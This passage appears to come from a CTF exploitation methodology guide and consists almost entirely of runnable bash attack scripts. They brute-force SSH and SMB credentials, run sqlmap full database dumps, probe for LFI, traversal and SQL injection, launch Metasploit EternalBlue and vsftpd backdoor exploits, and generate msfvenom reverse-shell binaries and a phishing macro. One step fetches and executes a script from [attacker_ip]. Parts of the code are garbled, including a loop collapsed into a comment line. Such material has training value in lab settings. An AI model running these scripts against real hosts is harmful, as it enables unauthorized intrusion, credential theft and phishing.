
```bash
# Reliability scoring system
calculate_exploit_score() {
    local exploit=$1
    local score=0
    
    # Check Metasploit ranking
    if msfconsole -q -x "info $exploit; exit" | grep -q "excellent"; then
        score=$((score + 30))
    elif msfconsole -q -x "info $exploit; exit" | grep -q "great"; then
        score=$((score + 20))
    fi
    
    # Check exploit publication date (newer = potentially less patched)
    pub_year=$(searchsploit -j "$exploit" | jq -r '.[].Published' | cut -d'-' -f1)
    current_year=$(date +%Y)
    if [ $((current_year - pub_year)) -lt 2 ]; then
        score=$((score + 15))
    fi
    
    # Check if kernel exploit (higher privilege potential)
    echo "$exploit" | grep -qi "kernel" && score=$((score + 25))
    
    # Check complexity (authenticated vs unauthenticated)
    msfconsole -q -x "info $exploit; exit" | grep -qi "unauthenticated" && \
        score=$((score + 20))
    
    echo "Exploit score for $exploit: $score"
}

# Prioritize web vulnerabilities by impact
web_vulnerability_priority() {
    echo "1. Remote Code Execution (RCE)"
    echo "2. SQL Injection with file write"
    echo "3. Local File Inclusion (LFI) to RCE"
    echo "4. Arbitrary File Upload"
    echo "5. SQL Injection (data exfil only)"
    echo "6. Cross-Site Scripting (XSS)"
    echo "7. Information Disclosure"
}
```

**Quick Win Identification:**

```bash
# Automated quick win scanner
#!/bin/bash

target=$1

echo "[*] Scanning for quick wins on $target"

# Check for anonymous FTP
echo "[+] Checking FTP..."
echo "anonymous" | timeout 5 ftp $target 2>&1 | grep -q "230 Login successful" && \
    echo "[!] QUICK WIN: Anonymous FTP access"

# Check for SMB null sessions
echo "[+] Checking SMB..."
smbclient -L //$target -N 2>/dev/null | grep -q "Sharename" && \
    echo "[!] QUICK WIN: SMB null session possible"

# Check for default credentials on common ports
echo "[+] Checking default creds..."
for service_port in "22:ssh" "21:ftp" "3306:mysql" "5432:postgresql" "8080:http"; do
    port=$(echo $service_port | cut -d: -f1)
    service=$(echo $service_port | cut -d: -f2)
    
    nc -zv $target $port 2>&1 | grep -q succeeded && \
        hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-$service.txt \
        $target $service -t 4 2>/dev/null | grep -q "password:" && \
        echo "[!] QUICK WIN: Default credentials on $service"
done

# Check for directory traversal
echo "[+] Checking directory traversal..."
curl -s "http://$target/../../../../etc/passwd" | grep -q "root:" && \
    echo "[!] QUICK WIN: Directory traversal vulnerability"

# Check for exposed .git
echo "[+] Checking exposed repositories..."
curl -s "http://$target/.git/config" | grep -q "\[core\]" && \
    echo "[!] QUICK WIN: Exposed .git repository"
```

### Staged Exploitation Approach

Staged exploitation breaks complex attacks into discrete phases, allowing systematic progress tracking and pivot point identification.

**Four-Stage Exploitation Model:**

```bash
# Stage 1: Initial Reconnaissance and Enumeration
# Objective: Map attack surface completely
# Time allocation: 20-30% of total time

stage1_reconnaissance() {
    target=$1
    mkdir -p recon/{nmap,web,services}
    
    # Comprehensive port scan
    nmap -sS -sV -sC -O -p- -oA recon/nmap/full_scan $target &
    nmap_pid=$!
    
    # Quick scan for immediate exploitation
    nmap -sV -T4 --top-ports 1000 -oN recon/nmap/quick_scan.txt $target
    
    # Service-specific enumeration
    if grep -q "80/tcp\|443/tcp" recon/nmap/quick_scan.txt; then
        gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
            -o recon/web/gobuster.txt -t 50 &
        nikto -h http://$target -o recon/web/nikto.txt &
    fi
    
    if grep -q "139/tcp\|445/tcp" recon/nmap/quick_scan.txt; then
        enum4linux -a $target > recon/services/enum4linux.txt &
    fi
    
    if grep -q "21/tcp" recon/nmap/quick_scan.txt; then
        nmap --script ftp-* -p 21 $target -oN recon/services/ftp_enum.txt &
    fi
    
    wait $nmap_pid
    echo "[+] Stage 1 complete - Attack surface mapped"
}

# Stage 2: Vulnerability Identification
# Objective: Match discovered services to known exploits
# Time allocation: 15-20% of total time

stage2_vulnerability_identification() {
    target=$1
    mkdir -p vulns
    
    # Extract service versions
    grep -E "open.*tcp" recon/nmap/full_scan.nmap | \
        awk '{print $3,$4,$5,$6}' > vulns/services_list.txt
    
    # Search for exploits
    while read service; do
        echo "=== Searching exploits for: $service ===" >> vulns/searchsploit.txt
        searchsploit "$service" >> vulns/searchsploit.txt
        echo "" >> vulns/searchsploit.txt
    done < vulns/services_list.txt
    
    # Automated vulnerability scanning
    if grep -q "80/tcp\|443/tcp" recon/nmap/quick_scan.txt; then
        nuclei -u http://$target -t /root/nuclei-templates/cves/ -o vulns/nuclei_cves.txt
    fi
    
    echo "[+] Stage 2 complete - Vulnerabilities identified"
}

# Stage 3: Initial Access
# Objective: Gain foothold on target system
# Time allocation: 25-35% of total time

stage3_initial_access() {
    target=$1
    mkdir -p access
    
    # Try prioritized exploit list
    if grep -q "vsftpd 2.3.4" vulns/services_list.txt; then
        echo "[!] Attempting vsftpd 2.3.4 backdoor"
        msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; \
            set RHOST $target; exploit; exit" | tee access/vsftpd_attempt.txt
    fi
    
    # Web exploitation
    if [ -f recon/web/gobuster.txt ]; then
        # Check for file upload
        grep -E "upload|admin" recon/web/gobuster.txt | while read endpoint; do
            echo "[*] Testing $endpoint for file upload"
            # Manual testing required here
        done
    fi
    
    # Credential attacks
    if grep -q "22/tcp.*ssh" recon/nmap/quick_scan.txt; then
        echo "[*] Attempting SSH credential attack"
        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
            ssh://$target -t 4 -V | tee access/ssh_hydra.txt
    fi
    
    echo "[+] Stage 3 complete - Initial access attempt finished"
}

# Stage 4: Post-Exploitation and Privilege Escalation
# Objective: Elevate privileges and achieve objectives
# Time allocation: 25-35% of total time

stage4_post_exploitation() {
    echo "[*] Establishing persistence and escalating privileges"
    
    # Upload enumeration scripts
    # [Inference: Assumes shell access has been obtained]
    wget http://[attacker_ip]/linpeas.sh -O /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh | tee privesc_enum.txt
    
    # Check for quick wins
    sudo -l
    find / -perm -4000 -type f 2>/dev/null
    getcap -r / 2>/dev/null
    
    # Automated privilege escalation
    if grep -q "NOPASSWD.*ALL" privesc_enum.txt; then
        echo "[!] PRIVILEGE ESCALATION: sudo without password"
        sudo su
    fi
}
```

**Staged Exploitation Workflow Script:**

```bash
#!/bin/bash

TARGET=$1
LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
LPORT=4444

[ -z "$TARGET" ] && echo "Usage: $0 <target_ip>" && exit 1

echo "========================================="
echo "CTF Staged Exploitation Framework"
echo "Target: $TARGET"
echo "Attacker: $LHOST"
echo "========================================="

# Create project structure
mkdir -p ctf_$TARGET/{recon,vulns,access,post_exploit}
cd ctf_$TARGET

# Execute stages with time tracking
start_time=$(date +%s)

echo "[Stage 1/4] Reconnaissance"
stage1_reconnaissance $TARGET
stage1_end=$(date +%s)
echo "Stage 1 duration: $((stage1_end - start_time)) seconds"

echo "[Stage 2/4] Vulnerability Identification"
stage2_vulnerability_identification $TARGET
stage2_end=$(date +%s)
echo "Stage 2 duration: $((stage2_end - stage1_end)) seconds"

echo "[Stage 3/4] Initial Access"
stage3_initial_access $TARGET
stage3_end=$(date +%s)
echo "Stage 3 duration: $((stage3_end - stage2_end)) seconds"

echo "[*] Manual intervention may be required for Stage 4"
echo "[*] Review access logs and prepare post-exploitation"

total_time=$((stage3_end - start_time))
echo "Total exploitation time: $total_time seconds"
```

**Progressive Exploitation Documentation:**

```bash
# Maintain exploitation state tracking
cat > exploitation_log.md << 'EOF'
# CTF Exploitation Log - [Target Name]

## Stage 1: Reconnaissance (HH:MM - HH:MM)
- [ ] Port scan completed
- [ ] Service enumeration done
- [ ] Web directory enumeration finished
- [ ] SMB/NFS enumeration completed

### Findings:
- Open ports: 
- Interesting services:
- Potential vulnerabilities:

## Stage 2: Vulnerability Analysis (HH:MM - HH:MM)
- [ ] CVE research completed
- [ ] Exploit availability confirmed
- [ ] Attack vectors prioritized

### Exploits to try:
1. [Exploit name] - Priority: High/Medium/Low - ETA: X minutes
2. 

## Stage 3: Exploitation (HH:MM - HH:MM)
- [ ] Initial access obtained
- [ ] Shell stabilized
- [ ] Lateral movement explored

### Successful exploit:
- Method:
- Credentials used:
- User context:

## Stage 4: Privilege Escalation (HH:MM - HH:MM)
- [ ] Enumeration completed
- [ ] Privilege escalation vector identified
- [ ] Root/SYSTEM access obtained

### Privilege escalation method:
- Vulnerability:
- Exploit used:
- Final privileges:

## Objectives Completed:
- [ ] User flag: 
- [ ] Root flag:
- [ ] Additional objectives:
EOF
```

### Multiple Exploitation Vectors

Parallel exploitation testing maximizes efficiency by pursuing multiple attack paths simultaneously, increasing the probability of successful compromise.

**Parallel Vector Execution:**

```bash
#!/bin/bash
# Parallel exploitation framework

target=$1
vectors_dir="exploitation_vectors"
mkdir -p $vectors_dir

# Vector 1: Web Application Exploitation
(
    echo "[Vector 1] Starting web application attacks"
    
    # SQL injection
    sqlmap -u "http://$target/login.php" --forms --batch --dump-all \
        --threads 5 > $vectors_dir/sqlmap.log 2>&1
    
    # Command injection
    commix -u "http://$target/search.php?q=test" --batch \
        > $vectors_dir/commix.log 2>&1
    
    # LFI/RFI scanning
    while IFS= read -r payload; do
        response=$(curl -s "http://$target/page.php?file=$payload")
        echo "$response" | grep -q "root:" && \
            echo "[!] LFI successful with payload: $payload" | \
            tee -a $vectors_dir/lfi_success.txt
    done < /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
    
    echo "[Vector 1] Web exploitation complete"
) &

# Vector 2: Network Service Exploitation
(
    echo "[Vector 2] Starting network service attacks"
    
    # SMB exploitation
    if nc -zv $target 445 2>&1 | grep -q succeeded; then
        crackmapexec smb $target -u users.txt -p passwords.txt \
            --continue-on-success > $vectors_dir/smb_creds.log 2>&1
        
        # EternalBlue check
        nmap --script smb-vuln-ms17-010 -p445 $target \
            -oN $vectors_dir/eternalblue.txt
    fi
    
    # SSH brute force with smart wordlist
    if nc -zv $target 22 2>&1 | grep -q succeeded; then
        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
            ssh://$target -t 16 -V -f > $vectors_dir/ssh_hydra.log 2>&1
    fi
    
    echo "[Vector 2] Network service exploitation complete"
) &

# Vector 3: Default Credentials and Misconfigurations
(
    echo "[Vector 3] Starting credential and misconfiguration checks"
    
    # Test default credentials on all discovered services
    nmap_services=$(grep "open" recon/nmap/quick_scan.txt | awk '{print $1}' | cut -d/ -f1)
    
    for port in $nmap_services; do
        service=$(grep "$port/tcp" recon/nmap/quick_scan.txt | awk '{print $3}')
        
        case $service in
            mysql)
                mysql -h $target -u root -p'' -e "SELECT version();" 2>/dev/null && \
                    echo "[!] MySQL root with no password" >> $vectors_dir/default_creds.txt
                ;;
            postgresql)
                PGPASSWORD='' psql -h $target -U postgres -c "SELECT version();" 2>/dev/null && \
                    echo "[!] PostgreSQL with empty password" >> $vectors_dir/default_creds.txt
                ;;
            http)
                for cred in "admin:admin" "admin:password" "root:root"; do
                    user=$(echo $cred | cut -d: -f1)
                    pass=$(echo $cred | cut -d: -f2)
                    response=$(curl -s -X POST "http://$target/login" \
                        -d "username=$user&password=$pass")
                    echo "$response" | grep -qi "dashboard\|welcome\|success" && \
                        echo "[!] Valid credentials: $cred" >> $vectors_dir/default_creds.txt
                done
                ;;
        esac
    done
    
    echo "[Vector 3] Credential checks complete"
) &

# Vector 4: Client-Side Exploitation (if applicable)
(
    echo "[Vector 4] Starting client-side attack preparation"
    
    # Generate payloads for potential social engineering
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 \
        -f exe -o $vectors_dir/payload.exe 2>/dev/null
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4445 \
        -f elf -o $vectors_dir/payload.elf 2>/dev/null
    
    # Macro payload for phishing
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4446 \
        -f vba -o $vectors_dir/macro_payload.vba 2>/dev/null
    
    echo "[Vector 4] Client-side payloads generated"
) &

# Vector 5: Public Exploit Database
(
    echo "[Vector 5] Testing known exploits"
    
    while read service_version; do
        service=$(echo "$service_version" | awk '{print $1}')
        version=$(echo "$service_version" | awk '{print $2}')
        
        searchsploit "$service $version" -w | grep -v "Exploit Title" | \
        while read exploit_line; do
            exploit_url=$(echo "$exploit_line" | grep -oP 'https://\S+')
            [ -n "$exploit_url" ] && echo "$exploit_url" >> $vectors_dir/exploits_to_try.txt
        done
    done < vulns/services_list.txt
    
    # Download and test exploits (manual review recommended)
    echo "[Vector 5] Exploit enumeration complete"
) &

# Wait for all vectors to complete
wait

echo "========================================="
echo "Multi-Vector Exploitation Results"
echo "========================================="

# Aggregate results
echo "[*] Web exploitation results:"
[ -f $vectors_dir/sqlmap.log ] && grep -q "available databases" $vectors_dir/sqlmap.log && \
    echo "  [+] SQL injection successful"

[ -f $vectors_dir/lfi_success.txt ] && \
    echo "  [+] LFI successful - $(wc -l < $vectors_dir/lfi_success.txt) payloads worked"

echo "[*] Network service results:"
[ -f $vectors_dir/smb_creds.log ] && grep -q "Pwn3d!" $vectors_dir/smb_creds.log && \
    echo "  [+] Valid SMB credentials found"

[ -f $vectors_dir/ssh_hydra.log ] && grep -q "password:" $vectors_dir/ssh_hydra.log && \
    echo "  [+] Valid SSH credentials found"

echo "[*] Default credential results:"
[ -f $vectors_dir/default_creds.txt ] && cat $vectors_dir/default_creds.txt

echo "[*] Exploit database results:"
[ -f $vectors_dir/exploits_to_try.txt ] && \
    echo "  [+] $(wc -l < $vectors_dir/exploits_to_try.txt) potential exploits identified"
```

**Vector Decision Matrix:**

```bash
# Automated vector selection based on discovered services
select_exploitation_vectors() {
    local target=$1
    local vectors=()
    
    # Web vectors
    if grep -qE "80/tcp|443/tcp|8080/tcp" recon/nmap/quick_scan.txt; then
        vectors+=("web_sqli")
        vectors+=("web_rce")
        vectors+=("web_file_upload")
        vectors+=("web_lfi")
    fi
    
    # Windows-specific vectors
    if grep -qE "445/tcp|3389/tcp|135/tcp" recon/nmap/quick_scan.txt; then
        vectors+=("smb_exploit")
        vectors+=("rdp_bruteforce")
        vectors+=("ms17_010")
    fi
    
    # Linux-specific vectors
    if grep -qE "22/tcp" recon/nmap/quick_scan.txt && \
       grep -q "Linux" recon/nmap/quick_scan.txt; then
        vectors+=("ssh_bruteforce")
        vectors+=("ssh_user_enum")
    fi
    
    # Database vectors
    if grep -qE "3306/tcp|5432/tcp|1433/tcp" recon/nmap/quick_scan.txt; then
        vectors+=("database_default_creds")
        vectors+=("database_exploit")
    fi
    
    echo "Selected vectors: ${vectors[@]}"
    
    # Execute selected vectors
    for vector in "${vectors[@]}"; do
        execute_vector_$vector $target &
    done
}
```

**Fallback Vector Strategy:**

```bash
# When primary vectors fail, attempt alternative approaches
fallback_exploitation() {
    target=$1
    
    echo "[*] Primary exploitation vectors failed, attempting fallbacks"
    
    # Fallback 1: Exhaustive service fingerprinting
    echo "[Fallback 1] Deep service fingerprinting"
    for port in $(nmap -p- --open $target | grep ^[0-9] | cut -d'/' -f1); do
        amap -d $target $port | tee -a fallback_amap.txt
    done
    
    # Fallback 2: Brute force with extended wordlists
    echo "[Fallback 2] Extended credential attacks"
    if grep -q "22/tcp" recon/nmap/quick_scan.txt; then
        hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
              -P /usr/share/wordlists/rockyou.txt ssh://$target -t 16
    fi
    
    # Fallback 3: Protocol-specific fuzzing
    echo "[Fallback 3] Protocol fuzzing"
    # [Inference: Requires custom fuzzing scripts per protocol]
    
    # Fallback 4: Social engineering preparation
    echo "[Fallback 4] Preparing social engineering vectors"
    # Generate phishing payloads, documentation, etc.
    
    # Fallback 5: Manual code review (if source available)
    echo "[Fallback 5] Manual analysis recommended"
    if [ -d "source_code" ]; then
        grep -rn "eval\|exec\|system\|shell_exec" source_code/
        grep -rn "SELECT.*FROM.*WHERE" source_code/
    fi
}
```

### Time Management

Effective time management prevents tunnel vision on unproductive exploitation paths and ensures comprehensive coverage of viable attack vectors.

**Time-Boxed Exploitation Schedule:**

```bash
#!/bin/bash
# CTF Time Management Framework

TOTAL_TIME=14400  # 4 hours in seconds
START_TIME=$(date +%s)

time_remaining() {
    current=$(date +%s)
    elapsed=$((current - START_TIME))
    remaining=$((TOTAL_TIME - elapsed))
    echo "$remaining"
}

time_elapsed() {
    current=$(date +%s)
    echo "$((current - START_TIME))"
}

# Phase allocation (in seconds)
RECON_TIME=1800      # 30 minutes
VULN_IDENT=1200      # 20 minutes
INITIAL_ACCESS=2400  # 40 minutes
PRIV_ESC=2100        # 35 minutes
DOCUMENTATION=600    # 10 minutes
BUFFER=6300          # 1 hour 45 minutes for unexpected issues

echo "=== CTF Time Management System ==="
echo "Total time: $((TOTAL_TIME / 60)) minutes"
echo "Start time: $(date)"
echo "End time: $(date -d @$((START_TIME + TOTAL_TIME)))"

# Phase 1: Reconnaissance (30 minutes)
echo ""
echo "[Phase 1/5] Reconnaissance - Allocated: $((RECON_TIME / 60)) minutes"
phase_start=$(date +%s)

timeout $RECON_TIME bash -c '
    target=$1
    nmap -sV -sC -p- -T4 $target -oA full_scan &
    nmap -sV --top-ports 1000 $target -oN quick_scan.txt
    
    if grep -q "80/tcp\|443/tcp" quick_scan.txt; then
        gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt -t 50 &
        nikto -h http://$target &
    fi
    wait
' _ $1

phase_end=$(date +%s)
phase_duration=$((phase_end - phase_start))
echo "Phase 1 completed in $((phase_duration / 60)) minutes"
echo "Time remaining: $(($(time_remaining) / 60)) minutes"

# Phase 2: Vulnerability Identification (20 minutes)
echo ""
echo "[Phase 2/5] Vulnerability Identification - Allocated: $((VULN_IDENT / 60)) minutes"
phase_start=$(date +%s)

timeout $VULN_IDENT bash -c '
    grep -E "open.*tcp" quick_scan.txt | while read line; do
        service=$(echo $line | awk "{print \$3,\$4,\$5}")
        searchsploit "$service" | head -10
    done
    
    # Automated vulnerability scanning
    nuclei -u http://$1 -t /root/nuclei-templates/ -severity critical,high
' _ $1

phase_end=$(date +%s)
phase_duration=$((phase_end - phase_start))
echo "Phase 2 completed in $((phase_duration / 60)) minutes"
echo "Time remaining: $(($(time_remaining) / 60)) minutes"

# Check if we need to skip to faster methods
if [ $(time_remaining) -lt 7200 ]; then
    echo "[!] WARNING: Less than 2 hours remaining, prioritizing quick wins"
    INITIAL_ACCESS=1800  # Reduce to 30 minutes
    PRIV_ESC=1500        # Reduce to 25 minutes
fi
```

**Exploit Timeout Mechanism:**

```bash
# Prevent time-wasting on single exploits
timed_exploit_attempt() {
    local exploit_name=$1
    local timeout_seconds=$2
    local command=$3
    
    echo "[*] Attempting: $exploit_name (timeout: ${timeout_seconds}s)"
    
    start=$(date +%s)
    timeout $timeout_seconds bash -c "$command"
    exit_code=$?
    end=$(date +%s)
    duration=$((end - start))
    
    if [ $exit_code -eq 124 ]; then
        echo "[-] $exploit_name timed out after ${timeout_seconds}s - moving on"
        return 1
    elif [ $exit_code -eq 0 ]; then
        echo "[+] $exploit_name succeeded in ${duration}s"
        return 0
    else
        echo "[-] $exploit_name failed after ${duration}s"
        return 1
    fi
}

# Usage examples
timed_exploit_attempt "SQLMap Database Dump" 300 \
    "sqlmap -u 'http://target/page.php?id=1' --dump --batch"

timed_exploit_attempt "SSH Brute Force" 600 \
    "hydra -L users.txt -P passwords.txt ssh://target -t 16"

timed_exploit_attempt "Metasploit EternalBlue" 180 \
    "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST target; exploit; exit'"
```

**Priority Queue with Time Weights:**

```bash
# Dynamic exploit prioritization based on remaining time
#!/bin/bash

declare -A exploit_queue
exploit_queue=(
    ["vsftpd_backdoor"]="5:high"        # time_minutes:priority
    ["eternalblue"]="10:high"
    ["ssh_bruteforce"]="30:medium"
    ["web_sqli"]="20:high"
    ["kernel_exploit"]="15:medium"
    ["smb_relay"]="25:low"
)

sort_by_priority_and_time() {
    local remaining_minutes=$(($(time_remaining) / 60))
    
    echo "=== Exploit Queue (${remaining_minutes}m remaining) ==="
    
    for exploit in "${!exploit_queue[@]}"; do
        time_cost=$(echo ${exploit_queue[$exploit]} | cut -d: -f1)
        priority=$(echo ${exploit_queue[$exploit]} | cut -d: -f2)
        
        # Skip exploits that would take too long
        if [ $time_cost -gt $remaining_minutes ]; then
            continue
        fi
        
	# Calculate weighted score (priority bonus - time penalty)
    case $priority in
        high) score=$((100 - time_cost)) ;;
        medium) score=$((50 - time_cost)) ;;
        low) score=$((25 - time_cost)) ;;
    esac
    
    echo "$score:$exploit:$time_cost:$priority"
done | sort -rn | while IFS=: read score exploit time priority; do
    echo "  [$priority] $exploit - ETA: ${time}m (score: $score)"
done
}

# Execute highest priority exploits until time runs out
execute_priority_queue() { while [ $(time_remaining) -gt 300 ]; do # Keep 5min buffer sort_by_priority_and_time | head -1 | while IFS=: read score exploit time priority; do [ -z "$exploit" ] && break
        echo "[*] Executing: $exploit"
        case $exploit in
            vsftpd_backdoor)
                timed_exploit_attempt "$exploit" $((time * 60)) \
                    "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST $TARGET; exploit'"
                ;;
            eternalblue)
                timed_exploit_attempt "$exploit" $((time * 60)) \
                    "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST $TARGET; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; exploit'"
                ;;
            ssh_bruteforce)
                timed_exploit_attempt "$exploit" $((time * 60)) \
                    "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 16 -f"
                ;;
            web_sqli)
                timed_exploit_attempt "$exploit" $((time * 60)) \
                    "sqlmap -u 'http://$TARGET/vuln.php?id=1' --batch --dump"
                ;;
        esac
        
        # Remove from queue after attempt
        unset exploit_queue[$exploit]
    done
done
}

```

**Progress Tracking and Pivot Points:**

```bash
#!/bin/bash
# Milestone-based time management

declare -A milestones
milestones=(
    ["enumeration_complete"]=0
    ["vulnerability_identified"]=0
    ["initial_access"]=0
    ["user_flag"]=0
    ["privesc_enum"]=0
    ["root_flag"]=0
)

mark_milestone() {
    milestone=$1
    milestones[$milestone]=$(date +%s)
    elapsed=$(($(date +%s) - START_TIME))
    
    echo "[✓] Milestone: $milestone (${elapsed}s elapsed)"
    
    # Log to file for post-CTF analysis
    echo "$(date +%Y-%m-%d\ %H:%M:%S),$milestone,$elapsed" >> timeline.csv
}

check_progress() {
    elapsed=$(time_elapsed)
    remaining=$(time_remaining)
    
    echo ""
    echo "=== Progress Check ==="
    echo "Time elapsed: $((elapsed / 60))m"
    echo "Time remaining: $((remaining / 60))m"
    echo ""
    
    # Assess completion status
    if [ ${milestones[initial_access]} -eq 0 ] && [ $elapsed -gt 3600 ]; then
        echo "[!] WARNING: No initial access after 1 hour"
        echo "[!] Consider changing strategy or moving to different target"
        echo ""
        echo "Recommended actions:"
        echo "  1. Review all enumeration data for missed details"
        echo "  2. Test default credentials on all services"
        echo "  3. Try simpler exploitation vectors"
        echo "  4. Check for web vulnerabilities (LFI, RFI, upload)"
        return 1
    fi
    
    if [ ${milestones[initial_access]} -gt 0 ] && [ ${milestones[user_flag]} -eq 0 ]; then
        access_time=$((elapsed - milestones[initial_access]))
        if [ $access_time -gt 1800 ]; then
            echo "[!] WARNING: Shell access but no user flag after 30 minutes"
            echo "[!] Recommended: Focus on file system enumeration"
            return 1
        fi
    fi
    
    if [ ${milestones[user_flag]} -gt 0 ] && [ ${milestones[root_flag]} -eq 0 ]; then
        user_time=$((elapsed - milestones[user_flag]))
        if [ $user_time -gt 2400 ]; then
            echo "[!] WARNING: User flag obtained but no root after 40 minutes"
            echo "[!] Recommended: Run automated privesc scripts"
            echo "  - linpeas.sh / winPEAS"
            echo "  - Check kernel exploits"
            echo "  - Review sudo permissions"
            return 1
        fi
    fi
    
    return 0
}

# Automated progress monitoring
monitor_progress() {
    while true; do
        sleep 600  # Check every 10 minutes
        check_progress
        
        # Alert when time is running low
        if [ $(time_remaining) -lt 1800 ]; then
            echo "[!!!] CRITICAL: Less than 30 minutes remaining!"
            echo "[!!!] Focus on completing current exploitation path"
        fi
        
        if [ $(time_remaining) -lt 0 ]; then
            echo "[!!!] TIME EXPIRED"
            break
        fi
    done
}
````

**Adaptive Time Allocation:**

```bash
# Dynamically adjust time allocation based on progress
adaptive_time_management() {
    target=$1
    
    # Initial quick scan (5 minutes)
    echo "[*] Quick enumeration (5m allocated)"
    timeout 300 nmap -sV --top-ports 100 $target -oN quick.txt
    
    # Assess complexity
    open_ports=$(grep -c "open" quick.txt)
    
    if [ $open_ports -lt 5 ]; then
        echo "[*] Few services detected - allocating more time to depth"
        RECON_TIME=2400      # 40 minutes
        EXPLOITATION_TIME=3600  # 60 minutes
    elif [ $open_ports -gt 20 ]; then
        echo "[*] Many services detected - breadth-first approach"
        RECON_TIME=1200      # 20 minutes
        EXPLOITATION_TIME=2400  # 40 minutes - quick attempts on many vectors
    else
        echo "[*] Standard service count - balanced approach"
        RECON_TIME=1800
        EXPLOITATION_TIME=3000
    fi
    
    # Check for obvious quick wins
    if grep -qE "vsftpd 2.3.4|ProFTPD 1.3.3c" quick.txt; then
        echo "[!] Known vulnerable service detected - fast-track exploitation"
        RECON_TIME=600       # Minimal recon
        EXPLOITATION_TIME=1800
    fi
    
    # Adjust based on web presence
    if grep -qE "80/tcp|443/tcp" quick.txt; then
        echo "[*] Web services present - allocating directory enumeration time"
        WEB_ENUM_TIME=1200
    fi
}
```

**Emergency Procedures for Time Pressure:**

```bash
# Last-resort tactics when time is critical
emergency_exploitation() {
    target=$1
    remaining=$(time_remaining)
    
    echo "[!!!] EMERGENCY MODE - $((remaining / 60)) minutes remaining"
    
    if [ $remaining -lt 600 ]; then
        echo "[!!!] Less than 10 minutes - attempting hail mary exploits"
        
        # Try everything simultaneously
        {
            # Default credentials on everything
            hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-credentials.txt \
                $target ssh &
            
            # Quick web vuln scan
            nuclei -u http://$target -t /root/nuclei-templates/cves/ -severity critical &
            
            # Check for anonymous access
            smbclient -L //$target -N &
            ftp $target << EOF
anonymous
anonymous
ls
quit
EOF
            
            # Check for easy misconfigurations
            curl -s http://$target/admin
            curl -s http://$target/phpinfo.php
            curl -s http://$target/.git/config
            
            wait
        } | tee emergency_attempts.txt
        
    elif [ $remaining -lt 1800 ]; then
        echo "[!] Less than 30 minutes - focus on highest probability targets"
        
        # Prioritize web exploitation (usually faster)
        if nc -zv $target 80 2>&1 | grep -q succeeded; then
            echo "[*] Focusing on web exploitation"
            
            # Quick directory scan
            gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt -t 50 -q
            
            # Test for common vulns
            curl -s "http://$target/../../../../etc/passwd" | grep -q "root:" && \
                echo "[!] LFI detected!"
            
            curl -s -X POST "http://$target/login" -d "username=admin' OR '1'='1&password=x" | \
                grep -qi "welcome\|dashboard" && echo "[!] SQLi detected!"
        fi
        
        # Try Metasploit auto-exploit
        echo "[*] Running Metasploit db_autopwn equivalent"
        msfconsole -q -x "workspace emergency; db_nmap -sV $target; search type:exploit; exit"
        
    elif [ $remaining -lt 3600 ]; then
        echo "[!] Less than 1 hour - skip deep enumeration"
        
        # Fast targeted scans only
        nmap -sV --version-intensity 5 -p- -T5 $target -oN fast_scan.txt
        
        # Immediate exploitation attempts
        while read line; do
            service=$(echo $line | awk '{print $3,$4}')
            searchsploit "$service" | head -3 | grep -oP '/\S+\.rb|/\S+\.py' | while read exploit; do
                echo "[*] Trying: $exploit"
                timeout 120 searchsploit -m $exploit
            done
        done < <(grep "open" fast_scan.txt)
    fi
}
```

**Time-Aware Decision Making:**

```bash
# Should we continue current path or pivot?
should_pivot() {
    current_task=$1
    time_invested=$2
    remaining=$(time_remaining)
    
    # Calculate if we have time for alternative approaches
    if [ $time_invested -gt 900 ] && [ ${milestones[initial_access]} -eq 0 ]; then
        echo "[!] Spent 15+ minutes on $current_task with no success"
        
        if [ $remaining -gt 7200 ]; then
            echo "[*] Decision: Continue (sufficient time remaining)"
            return 1
        else
            echo "[*] Decision: PIVOT to different vector"
            return 0
        fi
    fi
    
    # Privilege escalation taking too long
    if [ $time_invested -gt 1800 ] && [ ${milestones[root_flag]} -eq 0 ]; then
        echo "[!] Spent 30+ minutes on privilege escalation"
        
        if [ $remaining -gt 3600 ]; then
            echo "[*] Decision: Try different privesc method"
            return 0
        else
            echo "[*] Decision: Skip to easier target if available"
            return 0
        fi
    fi
    
    return 1
}

# Automated pivot decision
auto_pivot() {
    current_exploit=$1
    start_time=$2
    
    while true; do
        sleep 60  # Check every minute
        
        time_on_task=$(($(date +%s) - start_time))
        
        if should_pivot "$current_exploit" $time_on_task; then
            echo "[!] Auto-pivot triggered for $current_exploit"
            # Kill current exploit attempt
            pkill -f "$current_exploit"
            return 0
        fi
        
        # Check if exploit succeeded
        if [ -f "success_flag" ]; then
            return 1
        fi
    done
}
```

**Comprehensive Time Management Dashboard:**

```bash
#!/bin/bash
# Real-time CTF time management display

display_dashboard() {
    clear
    
    elapsed=$(($(date +%s) - START_TIME))
    remaining=$(time_remaining)
    percent_complete=$((elapsed * 100 / TOTAL_TIME))
    
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           CTF EXPLOITATION TIME MANAGEMENT                 ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    echo "║ Target: $TARGET                                            ║"
    echo "║ Start: $(date -d @$START_TIME +%H:%M:%S)                   End: $(date -d @$((START_TIME + TOTAL_TIME)) +%H:%M:%S)            ║"
    echo "╠════════════════════════════════════════════════════════════╣"
